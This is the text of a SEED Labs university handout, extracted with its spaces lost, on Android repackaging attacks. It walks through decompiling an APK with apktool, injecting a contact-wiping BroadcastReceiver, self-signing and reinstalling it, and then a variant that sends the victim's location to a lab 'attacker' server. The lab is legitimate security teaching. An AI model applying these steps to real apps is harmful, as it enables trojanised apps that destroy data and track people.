SEEDLabsŒAndroidRepackagingAttackLab 1 AndroidRepackagingAttackLab Copyright©2018WenliangDu SyracuseUniversity ThedevelopmentofthisdocumentwaspartiallyfundedbytheNationalScienceFoundationunderAward No.1303306and1718086.ThisworkislicensedunderaCreativeCommonsAttribution-NonCommercial- ShareAlike4.0InternationalLicense.Ahuman-readablesummaryof andnotasubstitutefor thelicenseis thefollowing Youarefreetocopyandredistributethematerialinanymediumorformat.Youmustgive appropriatecredit.Ifyouremix transform orbuilduponthematerial youmustdistributeyourcontributions underthesamelicenseastheoriginal.Youmaynotusethematerialforcommercialpurposes 1Overview RepackagingattackisaverycommontypeofattacksonAndroiddevices.Insuchanattack attackers modifyapopularappdownloadedfromappmarkets reverseengineertheapp addsomemaliciouspayloads andthenuploadtheapptoappmarkets.Userscanbeeasilyfooled becauseitishardtonotice thedifferencebetweentheappandtheoriginalapp.Oncetheappsareinstalled maliciouscodeinsidecanconductattacks usuallyinthebackground.Forexample inMarch2011 itwas foundthatDroidDreamTrojanhadbeenembeddedintomorethan50appsinAndroidofmarketand hadinfectedmanyusers.DroidDreamTrojanexploitsvulnerabilitiesinAndroidtogaintherootaccesson thedevice ThelearningobjectiveofthislabisforstudentstogainaexperienceinAndroidrepackaging attack sotheycanbetterunderstandthisparticularriskassociatedwithAndroidsystems andbemore cautiouswhendownloadingappstotheirdevices especiallyfromthoseuntrustedthird-partymarkets.In thislab studentswillbeaskedtoconductasimplerepackagingattackonaselectedapp anddemonstratethe attackonlyonourprovidedAndroidVM.Studentsshouldbewarnednottosubmittheirrepackagedapps toanymarket ortheywillfacelegalconsequence.NorshouldtheyruntheattackontheirownAndroid devices asthatmaycauserealdamages WhatmakesrepackagingattackeasyisthatAndroidapps'binarycodecanbeeasilyreverseengineered duetothelackofprotectiononbinaries.TheleftpartofFigure1depictsthetypicaldevelopmentprocess ofAndroidapps whichproducesacalledAPKThisisuploadedtoappmarketsforothers todownload.TherightpartoftheshowsthatonceattackersgettheAPKtheycanusereverse engineeringtoolstounpacktheAPKdisassembletheprogram addmaliciouslogic andthenpackage everythingbacktoAPKagain.Attackersthenuploadtherepackagedapptoappmarkets mostofwhichdonothavecountermeasurestodetectwhetheranappisrepackagedornot LabEnvironment Thelabrequirestwovirtualmachines oneiscalled SEEDAndroid andtheother iscalled SEEDUbuntu16.04 .Asthenameindicates theVMisavirtualmachinerunningAndroid operatingsystem andweneedittotestourrepackagingattack.ThesecondVMisaUbuntuLinuxvirtual machine allthetoolsneededforthislabhavealreadybeeninstalledonthisUbuntuVM.BothVMsand theirusermanualscanbedownloadedfromtheSEEDwebsite.ThesetwoVMsneedtobeconnectedto thesamenetwork wecanattachthesame '' NatNetwork '' adaptortobothVMs SEEDLabsŒAndroidRepackagingAttackLab 2 Figure1 OverviewoftheRepackagingattack 2LabTasks 2.1Task1 ObtainAnAndroidApp APKandInstallIt Tolaunchtherepackagingattack weneedahostapp.Inrealattacks attackersusuallychoosepopularapps becausetheycangetmorepeopletodownloadtheirrepackagedapps.Forthistask youcanwriteyourown appordownloadanexistingapp.YoucangetAPKforAndroidapplicationsfrommanyplaces asthiswebsite https //apkpure.com/ .Wealsoprovideasimpleappforyoutodownload nameis RepackagingLab.apk ItshouldbenotedthatweareusinganAndroidVMinthislab notaphysicalAndroiddevice sosome appsmaynotrunontheVM theywillcrash .Oneofthepossiblereasonsforcrashingisthattheapplication mayhavenativecode.NativecodecompiledforarealAndroiddevicehasbinarycodeforARMprocessors whileourAndroidVMrunsonx86processors.TogettheseappstoruninourAndroidVM thenativecode needstoberecompiledforx86processors.Thatrequiressourcecode whichishardtoget.Therefore ifyou haveencounteredthisproblem justanotherapp.Thislimitationisonlycausedbythelabenvironment itisnotanissuefortheattacksintherealworld Letusinstallthehostapp.Wewilldoitusingthe adb toolfromtheUbuntuVM.First weneedto theIPaddressoftheAndroidVM.Thiscanbeachievedbyrunningthe ifconfig commandinthe AndroidTerminalapp.Wethenrunthefollowingcommandstoinstalltheapp //ConnecttotheAndroidVMusingadb $ adbconnect < ip_address_of_android_vm > //Installtheapp $ adbinstall < application_name > .apk SEEDLabsŒAndroidRepackagingAttackLab 3 2.2Task2 DisassembleAndroidApp Tolaunchtherepackagingattackonanapp weneedtomodifytheapp.Althoughwecandirectlymodify theAPKitisnoteasy becausethecodeintheAPKcontainsDalvikbytecode dexformat isnotmeantforhumantoread.Weneedtoconvertthebytecodeintosomethingthatishumanreadable ThemostcommonhumanreadableformatforDalvikbytecodeisknownasSmali.ThenamesﬁSmaliﬂand ﬁBaksmaliﬂaretheIcelandicequivalentsofﬁassemblerﬂandﬁdisassemblerﬂ respectively Inthistask wewilluseatoolcalled APKTool todisassembledexcode classes.dex tosmali code APKTool isaverypowerfulreverseengineeringtoolforAndroidapps.Itisusefultodecodeand rebuildAndroidapps.WecanfeedtheentireAPKtothetoollikethefollowing $ apktoold appname .apk APKisjustazipwhichcontains classes.dex compiledjavasourcecode calledDalvik bytecode resources.arsc resource AndroidManifest.xml etc APKTool basicallyun- zipstheAPKanddecodeitscontents.Fortheresourcenotmuchneedstobedone.FortheDalvik bytecode classes.dex itisdisassembledintosmalicode APKTool placestheoutputintoacre- atedfolderwithanamethatisthesameasthenameoftheAPKThetypicalfolderstructureofAPK afterdisassemblyisshowninFigure2.Thefoldercontains XML resource AndroidManifest sourcecodeetc.The XML resourcesand AndroidManifest shouldbereadableandusually veryclosetotheiroriginalforms.Thedisassembledsmalicodeisplacedinthesmalifolder.Typically one smalicontainsthecodeforoneJavaclass Whatwewilldonextistoinjectsomemaliciouscodeintothesmalifolder andthenassembleeverything togetherintoanewAPKpackage.ThatiswhyitiscalledRepackagingattack 2.3Task3 InjectMaliciousCode Inthistask wewillinjectmaliciouscodeintothetargetapp'ssmalicode.Therearemanywaystodothat Oneapproachistodirectlymodifysomeexistingsmalisowecanaddmaliciouslogicintoit.Another approach whichismucheasier istoaddacompletelynewcomponenttotheapp thisnewcomponent isindependentfromtheexistingapp soitdoesnotaffecttheapp'sbehavior.Sinceeachindependent componentcanbeplacedinaseparatesmaliusingthisapproach wejustneedtocreateanewsmali TherearefourtypesofcomponentsinAndroidapps activity service broadcastreceiver content provider .Thetwocomponentsaremostcommonlyusedbyapps whiletheothertwoarenotas common.Wecanaddanyofthesecomponentsinthetargetapp butthemostimportantproblemforthe attackistoawaytotriggerthemaliciouscodewithoutbeingnoticedbyusers.Althoughsolutionsto theproblemexistforallthesecomponents theeasiestoneisbroadcastreceiver whichcanbetriggeredby broadcastssentbythesystem.Forexample whenthesystemtimeisset TIME SET broadcastwillbesent afterthesystemreboots BOOT COMPLETED broadcastwillbesentout.Wecanwriteabroadcast receiverthatlistenstooneofthesebroadcasts sothemaliciouscodewillbeautomaticallytriggeredby thoseevents WritingabroadcastreceiverinAndroidisquitestraightforward.Ifyouknowhowtodothat feelfreeto writeyourowncode.AfteryouhavebuiltanAPKfromyourownJavacode youshouldrun APKTool todisassembleyourAPKandobtainthesmalicodeforyourbroadcastreceiver.Forthosewhohavenot takenanyAndroidprogrammingcourse youcanuseourprovidedsmalicode.TheJavacodeisdescribed inthefollowing whilethesmalicodecanbedownloadedfromthewebsiteofthislab publicclassMaliciousCodeextendsBroadcastReceiver { SEEDLabsŒAndroidRepackagingAttackLab 4 Figure2 APKstructureafterrunning APKTool @ Override publicvoidonReceive Contextcontext Intentintent { ContentResolvercontentResolver=context.getContentResolver Cursorcursor=contentResolver.query ContactsContract.Contacts.CONTENT_URI null null null null cursor.moveToNext { StringlookupKey=cursor.getString cursor.getColumnIndex ContactsContract.Contacts.LOOKUP_KEY Uriuri=Uri.withAppendedPath ContactsContract.Contacts.CONTENT_LOOKUP_URI lookupKey contentResolver.delete uri null null } } } Theabovemaliciouscode iftriggered willdeleteallthecontactrecordsfromthedevice.Thecode implementsabroadcastreceiver whichwillbetriggeredbyabroadcastevent.Onceitistriggered itenters onReceive method andthisiswhereweimplementourmaliciouslogic.Thecodeabovebasically SEEDLabsŒAndroidRepackagingAttackLab 5 interactswiththe Contacts app'scontentprovider andasksthecontentprovidertoremoveallitsentries essentiallywipingoutallthecontactrecords.Inthecode ContentResolver isusedtoaccessthe contactsstoredonthephone.Inordertogetthelistofcontacts aqueryissentto Contacts 'content provider.Thisquerydoesnotprovideanymatchingcriterion soalltherecordsarereturnedviaa Cursor object.Thecodethengothroughalltheserecordsanddeletethemonebyone Youcandownloadthesmalicodeoftheaboveprogramfromourwebsite andplaceitinthe smali/com folderthatiscreatedby APKTool .However wearenotdoneyet becausewehavenottellthesystem whentoinvokeourbroadcastreceiver.Wehavetoregisterourbroadcastreceivertothesystem.Thisis donebyaddingsomeinformationtothetargetapp's AndroidManifest.xml whichcanalsobe foundfromthefoldercreatedby APKTool .Moreover inordertoreadfromandwriteto Contacts ' contentprovider anappneedstodeclaretwocorrespondingpermissionsin AndroidManifest.xml Thefollowingshowswhatneedstobeaddedtothemanifest < manifest ... > ... < uses-permissionandroid name= '' android.permission.READ_CONTACTS '' > À < uses-permissionandroid name= '' android.permission.WRITE_CONTACTS '' > Á ... < application > ... .. ... .. < receiverandroid name= '' com.MaliciousCode '' > < intent-filter > < actionandroid name= '' android.intent.action.TIME_SET '' > Â < /intent-filter > < /receiver > < /application > < /manifest > Intheabovemanifestweaddtwopermissionstoallowtheapptoreadfromandwriteto Contacts ' contentprovider Lines À Á .Itshouldbenotedthatthesepermissionsareaddedoutsideofthe < application > block butwithinthe < manifest > block.Inthe wealsoregisterourbroadcast receivertothe TIME SET broadcastevent Line Â soourcodecanbetriggeredeverytimewechange thetimeonthephone.Theregistrationshouldbeaddedinsidethe < application > block notin- sidethe < activity > block.Theapplicationthatyoudownloadedfromappmarketsmayhavealarge AndroidManifest.xml youshouldcarefullymodifytheandplacetheinjectedcontentsinthe rightplace 2.4Task4 RepackAndroidAppwithMaliciousCode Afterwehaveinsertedyourownmalicioussmalicode wearereadytoreassembleeverythingtogether buildasingleAPKTheprocesstakestwosteps Step1 RebuildAPK Weuse APKTool againtogenerateanewAPKThecommandisshownin thefollowing.Bydefault thenewAPKwillbesavedinthe dist directory $ apktoolb application_folder SEEDLabsŒAndroidRepackagingAttackLab 6 Step2 SigntheAPK Androidrequiresallappstobedigitallysignedbeforetheycanbeinstalled ThisrequireseachAPKtohaveadigitalsignatureandapublickeyTheandthe signaturehelpsAndroidtoidentifytheauthorofanapp.Fromthesecurityperspective theneeds tobesignedbyaauthority beforesigning needstoverifythattheidentifystoredinside theisindeedauthentic.Gettingafromanacceptedauthorityisusuallynot free soAndroidallowsdeveloperstosigntheirusingtheirownprivatekey i.e. isselfsigned.Thepurposeofsuchself-signedismeantforappstobeabletorunonAndroid devices notforsecurity.Developerscanputanynametheywantintheregardlessofwhetherthe nameislegallyownedbyothersornot becausenoauthorityisinvolvedtocheckthat.Obviously thisentirelydefeatsthepurposeofandsignature.GooglePlayStoredoessomenamev beforeacceptinganapp butotherthird-partyappmarketsdonotalwaysconductsuchavInthis lab wewilljustuseaself-signedTheentireprocessconsistsoftwosteps 1 Step1 Generateapublicandprivatekeypairusingthe keytool command $ keytool-alias < alias_name > -genkey-v-keystoremykey.keystore Thetoolwillpromptusersforapassword whichisusedtoprotectthekeystore italsoasksusersto providesomeadditionalinformationforthekey.Itthengeneratesapublic/privatekeypair andstore thatinakeystore mykey.keystore atthecommandline .Thekeystorecanstore multiplekeys eachbyanaliasnameinthecommand whichisthenamethatwe willuselaterwhensigningyourapp 2 Step2 Wecannowuse jarsigner tosigntheAPKusingthekeygeneratedintheprevious step.Wecandoitusingthefollowingcommand $ jarsigner-keystoremykey.keystoreapp_name.apk < alias_name > Thecommand jarsigner promptstheusertoenterthepassword whichisneededforaccessing thekeystore.Itthenusethekeybythealiasname tosigntheAPK 2.5Task5 InstalltheRepackagedAppandTriggertheMaliciousCode Inthisstep wewillinstalltheapponourAndroidVM andtestwhethertheattackissuc- cessfulornot.Ifwehavealreadyinstalledtheappbefore weneedtogotoAndroidVManduninstallthe appotherwise wewillnotbeabletoinstalltherepackagedapp becauseofthesignaturemismatch TheinstructionsforinstallationarethesameasthoseinTask1 Beforedemonstratingtheattack weneedtogiveourapplicationpermissiontoaccesscontacts.Inareal worldscenario applicationsusuallyaskusersforpermission.Permissionsforphotos contacts locationetc areverycommonlyaskedfor Settings- > Apps- > RepackagingLab- > Permissions- > togglecontactson Todemonstratewhethertheattackworks wejustneedtoruntheapplicationonce addafewcontacts inthe Contacts appandchangethetimeontheandroidVM.Ifyourattackissuccessful youshouldsee thatallthecontactrecordsthatyoujustenteredaredeleted.Tochangethetime dothefollowing Settings- > DateandTime- > Settime SEEDLabsŒAndroidRepackagingAttackLab 7 Commonproblems Weneedtoruntheinstalledrepackagedapplicationoncetoregisterthereceiver Otherwise theinjectedcodewillnotbeexecuted 2.6Task6 UsingRepackagingAttacktoTrackVictim'sLocation Inthistask wewillperformanotherrepackagingattackwherethemaliciouscodewillstealthelocation informationfromauser'sphone essentiallytrackingtheuser'smovement Step1.Settingupmocklocations OnanAndroiddevice wecangetthelocationinformationfromits GPShardware.However ourAndroidVMdoesnothavesuchhardware butAndroidOSdoesallowusto providemocklocationstoapplications.Allweneedtodoistowriteamocklocationapp andthen theAndroidOStogetlocationsfromthisapp insteadofarealGPShardware.Wehavealreadyinstalled suchanappintheAndroidVM.Thisappcansimulatelocationtracesinsixdifferentcities.Simplyselect acityfromtheapp Step2 DNS Themaliciouscodeintherepackagedappwillsendoutthevictim'scoordi- natestotheattacker'sserverat www.repackagingattacklab.com .WearegoingtousetheSEE- DUbuntuVMtohostthisserver.Therefore weneedtomapthehostnametotheUbuntuVM'sIPaddress Theeasiestwaytosetthisupistoaddalinetothe /system/etc/hosts ontheAndroidVM.We canuseatexteditortool suchas vi orsomeeditorapp todirectlymodifytheonAndroid //RunthefollowingcommandsontheUbuntuVM $ suroot # vi/system/etc/hosts Addthefollowingentrytotheendofhosts IP Addresswww.repackagingattacklab.com whereIP_AddressistheIPaddressoftheUbuntuVM IfyouarenotfamiliarwiththeeditingtoolonAndroid youcancopythetotheUbuntuVM makes changesinUbuntu andthencopythebacktoAndroid.Thefollowingcommandsareforthislatter approach //RunthefollowingcommandsontheUbuntuVM //AssumeAndroidVM'sIPis:10.0.2.9 //GettheUbuntuVM'sIPaddress $ ifconfig //Starttheadbdaemonwithrootprivilege $ adbroot //ConnecttotheAndroidVM $ adbconnect10.0.2.9 //DownloadthehostsfilefromtheAndroidVM $ adbpull/system/etc/hosts //ModifythedownloadedhostsfileonUbuntuVM $ gedit./hosts oruseyourownfavoritetexteditor SEEDLabsŒAndroidRepackagingAttackLab 8 Addthefollowingentrytotheendofhosts IP_Addresswww.repackagingattacklab.com whereIP_AddressistheIPaddressoftheUbuntuVM //UploadthehostsfilebacktotheAndroidVM $ adbpush./hosts/system/etc/hosts Step3 Repackagingandinstallingthevictimapp WewillfollowtheinstructionsinTasks1to5 toconducttherepackaging.Wewillevenusethesamehostapp.Theonlydifferenceisthatwearego- ingtouseanewsetofsmalicode whichcanbedownloadedfromourwebsite.Therearethreesmali MaliciousCode.smali SendData $ 1.smali SendData.smali .Placetheminthe smali/com/mobiseed/repackaging folderoftheunpackedapplication Wealsohavetomodifythe AndroidManifest.xml becausethemaliciouscoderequiresdifferent permissionsthantheoneusedinTasks1to5.Weneedthreepermissionsrelatedtolocationandonefor Internetaccess < manifest ... > ... < uses-permissionandroid name= '' android.permission.ACCESS_COARSE_LOCATION '' > < uses-permissionandroid name= '' android.permission.ACCESS_FINE_LOCATION '' > < uses-permissionandroid name= '' android.permission.ACCESS_MOCK_LOCATION '' > < uses-permissionandroid name= '' android.permission.INTERNET '' > ... < application > ... .. ... .. < receiverandroid name= '' com.mobiseed.repackaging.MaliciousCode '' > < intent-filter > < actionandroid name= '' android.intent.action.TIME_SET '' > < /intent-filter > < /receiver > < /application > < /manifest > Step4 EnablingthepermissionontheAndroidVM Addinglocationpermissionstothemanifest isnotenough.Whenanappisinstalledviaastoreapp suchasthePlaystore userswillbeaskedwhether theywillgrantthoselocationpermissionstotheapp.Ifusersapprove thePlaystorewilltellthesystem thatthepermissionsaregranted.Sinceweinstallourappviathe adb tool whichdoesnotpromptus forapprovals norwillitautomaticallyenablethesepermissionsfortheapp.Therefore wehavetodoit manually.Followthestepsbelowtoallowlocationaccess.Itshouldbenotedthatonarealphone usersdo notneedtoperformthisstepmanually Settings- > Apps- > RepackagingLab- > Permissions- > togglelocationon SEEDLabsŒAndroidRepackagingAttackLab 9 Step5 Triggeringtheattackingcode Nowwearereadytoseetheattackwork.Runthemocklocation applicationandchoosealocation thenchangethetimeonyourAndroidVM.Tochangetime clickthe followingsequence Settings- > dateandtime- > settime Step6 Trackingthevictim Oncethemaliciouscodeistriggered wecangobacktoourUbuntuVM load http //www.repackagingattacklab.com intoourFirefoxbrowser.Ifyourattackissuc- cessful youshouldbeabletotrackthevictimoftheAndroidVM.Youcangotothemocklocationappto changetoadifferentcity andseewhetheryourmaliciouscodecancorrectlytrackthevictim'smovement Pleasedescribeyourobservations 3SubmissionandDemonstration Youneedtosubmitadetailedlabreporttodescribewhatyouhavedoneandwhatyouhaveobserved includ- ingscreenshotsandcodesnippets ifneeded .Youalsoneedtoprovideexplanationtotheobservationsthat areinterestingorsurprising.Youareencouragedtopursuefurtherinvestigation beyondwhatisrequiredby thelabdescription 